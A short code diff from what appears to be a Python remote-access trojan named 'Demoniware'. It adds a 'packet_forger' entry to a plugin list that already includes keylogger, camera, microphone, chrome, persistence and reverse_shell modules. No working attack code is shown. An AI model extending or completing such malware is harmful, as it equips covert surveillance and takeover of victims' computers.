@@ -56,7 +56,7 @@ class Demoniware(object):
 
         self.node = '{}__{}'.format(platform.node(), uuid.getnode())
 
-        self.plugin_list = ['camera', 'chrome', 'upload', 'keylogger', 'microphone', 'persistence', 'proc', 'reverse_shell', 'screenshot', 'suicide', 'system']
+        self.plugin_list = ['camera', 'chrome', 'upload', 'keylogger', 'microphone', 'persistence', 'proc', 'reverse_shell', 'screenshot', 'suicide', 'system', 'packet_forger']
 
         self.plugins = {}
 
